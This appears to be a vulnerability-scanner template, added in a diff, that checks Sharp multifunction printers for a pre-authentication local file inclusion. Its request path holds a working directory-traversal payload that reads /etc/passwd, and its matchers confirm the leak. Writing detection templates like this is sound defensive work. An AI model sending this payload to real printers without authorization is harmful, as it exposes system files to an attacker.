@@ -1,0 +1,26 @@
+id: sharp-printers-lfi
+name: Sharp Multifunction Printers - Local File Inclusion
+severity: high
+confidence: confirmed
+description: It was observed that Sharp printers are vulnerable to a local file inclusion without authentication. Any attacker
+  can read any file located in the printer.
+reference: https://pierrekim.github.io/blog/2024-06-27-sharp-mfp-17-vulnerabilities.html#pre-auth-lfi
+tags:
+- sharp
+- printer
+- lfi
+- vuln
+requests:
+- method: GET
+  path: /installed_emanual_down.html?path=/manual/../../../etc/passwd
+  matchers:
+  - type: regex
+    regex:
+    - 'root:.*:0:0:'
+  - type: header
+    words:
+    - application/octet-stream; name=passwd
+  - type: status
+    status:
+    - 200
+  condition: and
